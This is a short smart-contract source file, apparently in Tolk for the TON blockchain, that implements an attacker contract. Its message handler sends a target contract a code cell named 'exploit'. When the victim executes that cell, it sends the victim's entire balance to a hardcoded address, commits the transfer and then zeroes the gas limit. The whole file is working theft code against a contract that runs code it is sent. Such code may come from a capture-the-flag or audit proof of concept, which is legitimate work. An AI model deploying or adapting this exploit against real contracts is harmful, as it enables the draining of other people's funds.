@inline
fun setGasLimit(limit: int): void
    asm "SETGASLIMIT";

@inline
fun exploit() {
    val msg = beginCell()
        .storeUint(0x10, 6) // non-bounce
        .storeSlice("EQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM9c"a)
        .storeCoins(0)
        .storeUint(0, 1 + 4 + 4 + 64 + 32 + 1 + 1)
    .endCell();

    // send all the contract balance
    sendRawMessage(msg, 128);
    
    commitContractDataAndActions();
    setGasLimit(0);
}

fun getExploitCell(): cell
    asm "<{ exploit INLINECALLDICT }>c PUSHREF";

// onInternalMessage is the main function of the contract and is called when it receives a message from other contracts
fun onInternalMessage(myBalance: int, msgValue: int, inMsgFull: cell, inMsgBody: slice) {
    if (inMsgBody.isEndOfSlice()) { // ignore all empty messages
        return;
    }

    var cs: slice = inMsgFull.beginParse();
    val flags: int = cs.loadUint(4);
    if (flags & 1) { // ignore all bounced messages
        return;
    }

    val target: slice = inMsgBody.loadAddress();
    val msgBody: cell = beginCell()
        .storeUint(0, 32)
        .storeRef(getExploitCell())
    .endCell();
    val msg: cell = beginCell()
        .storeUint(0x18, 6)
        .storeSlice(target)
        .storeCoins(0)
        .storeUint(1, 1 + 4 + 4 + 64 + 32 + 1 + 1)
        .storeRef(msgBody)
    .endCell();
                
    // send all the remaining value
    sendRawMessage(msg, 64);
}